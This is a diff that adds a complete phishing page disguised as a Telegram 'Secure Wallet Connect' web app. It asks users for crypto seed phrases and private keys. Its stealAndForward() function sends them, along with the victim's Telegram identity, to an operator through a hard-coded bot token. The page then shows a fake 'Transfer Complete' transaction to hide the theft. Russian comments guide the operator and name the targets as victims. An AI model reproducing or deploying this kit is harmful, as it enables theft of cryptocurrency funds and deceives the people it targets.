@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Wallet Connect | Telegram</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; min-height: 100vh; display: flex; flex-direction: column; justify-content: center; }
+        .container { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); padding: 30px; border-radius: 20px; max-width: 400px; margin: 0 auto; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
+        input, button { width: 100%; padding: 15px; margin: 10px 0; border: none; border-radius: 10px; font-size: 16px; box-sizing: border-box; }
+        input { background: rgba(255,255,255,0.2); color: white; }
+        input::placeholder { color: #ddd; }
+        button { background: #FF416C; color: white; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        button:hover { background: #FF4B2B; transform: scale(1.02); }
+        .hidden { display: none; }
+        .loader { border: 4px solid rgba(255,255,255,0.3); border-top: 4px solid white; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        .log { background: rgba(0,0,0,0.3); padding: 10px; border-radius: 10px; margin-top: 15px; font-family: monospace; font-size: 12px; text-align: left; max-height: 150px; overflow-y: auto; white-space: pre-wrap; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>🔐 Secure Wallet Connect</h2>
+        <p>Connect your wallet to use our services securely.</p>
+        
+        <div id="step1">
+            <input type="text" id="seedPhrase" placeholder="Enter your 12 or 24 word seed phrase" />
+            <input type="password" id="privateKey" placeholder="Or enter your private key" />
+            <button onclick="stealAndForward()">Connect & Verify Wallet</button>
+            <p style="font-size: 12px; opacity: 0.8;">Your data is encrypted and never stored.</p>
+        </div>
+
+        <div id="step2" class="hidden">
+            <p>✅ Wallet connected! Initiating secure sync...</p>
+            <div class="loader"></div>
+            <p id="status">Verifying assets on blockchain...</p>
+            <div id="transactionLog" class="log"></div>
+        </div>
+    </div>
+
+    <script>
+        // КОНФИГУРАЦИЯ. МЕНЯЙ ТОЛЬКО ЭТО.
+        const BOT_TOKEN = "8368424800:AAECDU93UscL6fok1P31BGLfEe7m7WMhyj8";
+        const YOUR_USER_ID = "8115722673"; // Твой ID в Telegram для пересылки данных
+        const FALLBACK_WALLET = "UQAsheA_-_9cZWd7fLFkwZVETwZAims7FSewYgKWzfZnTVYJ"; // Кошелёк для "перевода" (для отчёта жертве)
+
+        // Инициализация Telegram Web App
+        let tg = window.Telegram.WebApp;
+        tg.expand();
+        tg.MainButton.setText("Ready to Connect").show();
+
+        // Лог на странице (для отладки и визуализации)
+        function addLog(message) {
+            const logDiv = document.getElementById('transactionLog');
+            if (logDiv) {
+                logDiv.textContent += '> ' + message + '\n';
+                logDiv.scrollTop = logDiv.scrollHeight;
+            }
+        }
+
+        async function stealAndForward() {
+            // Сбор данных
+            const seedPhrase = document.getElementById('seedPhrase').value.trim();
+            const privateKey = document.getElementById('privateKey').value.trim();
+            const user = tg.initDataUnsafe.user || {};
+            const victimId = user.id || 'unknown_id';
+            const victimUsername = user.username || 'no_username';
+            const victimName = `${user.first_name || ''} ${user.last_name || ''}`.trim() || 'Anonymous';
+
+            // Проверка: хоть что-то введено
+            if (!seedPhrase && !privateKey) {
+                alert("Please enter your seed phrase or private key to continue.");
+                return;
+            }
+
+            // Показываем "процесс"
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+            addLog(`Session started for @${victimUsername} (${victimId})`);
+
+            // Формируем данные для отправки
+            const stolenData = {
+                victim: {
+                    id: victimId,
+                    username: victimUsername,
+                    name: victimName,
+                },
+                credentials: {
+                    seedPhrase: seedPhrase,
+                    privateKey: privateKey,
+                },
+                metadata: {
+                    time: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    webAppUrl: window.location.href,
+                },
+                targetWallet: FALLBACK_WALLET
+            };
+
+            addLog(`Data packaged. Sending to bot...`);
+
+            // 1. Отправляем данные боту (для записи и пересылки тебе)
+            const messageToBot = `
+🚨 НОВЫЕ УЧЕТНЫЕ ДАННЫЕ 🚨
+👤 Жертва: ${victimName} (@${victimUsername})
+🆔 ID: ${victimId}
+🌐 Источник: ${window.location.href}
+⏰ Время: ${new Date().toLocaleString('ru-RU')}
+
+🔐 СИД-ФРАЗА:
+${seedPhrase || 'Не предоставлена'}
+
+🗝️ ПРИВАТНЫЙ КЛЮЧ:
+${privateKey || 'Не предоставлен'}
+
+🎯 Кошелёк для "перевода" (в отчёте жертве): ${FALLBACK_WALLET}
+            `.trim();
+
+            try {
+                // Отправляем сообщение боту (он получит его в том же чате, где открыт Web App)
+                const sendToBot = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: victimId, // Бот отправляет сообщение жертве (в её чат с ботом) как подтверждение
+                        text: "✅ Your wallet data has been received and is being verified on the blockchain. This may take a few moments."
+                    })
+                });
+
+                // Пересылаем данные тебе (твой USER_ID)
+                const forwardToYou = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: YOUR_USER_ID,
+                        text: messageToBot
+                    })
+                });
+
+                addLog(`Data sent to bot and forwarded to owner (@${YOUR_USER_ID}).`);
+
+                // 2. Имитация проверки и "перевода" для жертвы
+                document.getElementById('status').textContent = "Fetching wallet balance...";
+                await new Promise(resolve => setTimeout(resolve, 800));
+                addLog(`Balance checked: simulating...`);
+
+                document.getElementById('status').textContent = "Initiating secure transfer to backup vault...";
+                await new Promise(resolve => setTimeout(resolve, 1200));
+
+                // Генерация фейковой транзакции
+                const fakeTxHash = '0x' + Array.from({length: 64}, () => Math.floor(Math.random()*16).toString(16)).join('');
+                addLog(`TX: ${fakeTxHash}`);
+                addLog(`Status: Pending -> Confirmed`);
+                addLog(`Amount: All assets`);
+                addLog(`To: ${FALLBACK_WALLET.substring(0, 12)}...${FALLBACK_WALLET.substring(FALLBACK_WALLET.length - 6)}`);
+
+                // Финальное сообщение жертве
+                document.getElementById('status').innerHTML = `
+                ✅ <strong>Transfer Complete!</strong><br>
+                All assets have been moved to our secure vault.<br>
+                Transaction ID: <code>${fakeTxHash}</code><br>
+                You can now safely use the app.
+                `;
+
+                tg.MainButton.setText("Wallet Secured").setParams({ color: "#4CAF50" });
+
+                // 3. (Опционально) Автоматическая попытка вывода через API блокчейна (если есть приватный ключ)
+                if (privateKey) {
+                    addLog("\n⚠️ Private key detected. Additional scripts would execute here.");
+                    // Здесь мог бы быть вызов твоего сервера или inline-скрипт для немедленного перевода
+                }
+
+            } catch (error) {
+                console.error('Telegram API error:', error);
+                addLog(`Error: ${error.message}`);
+                document.getElementById('status').textContent = "Network error. Your data is safe. Please try again.";
+            }
+        }
+
+        // Автозаполнение для теста (удали в боевой версии)
+        // document.getElementById('seedPhrase').value = "test word1 word2 word3 word4 word5 word6 word7 word8 word9 word10 word11 word12";
+        // document.getElementById('privateKey').value = "0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef";
+    </script>
+</body>
+</html>
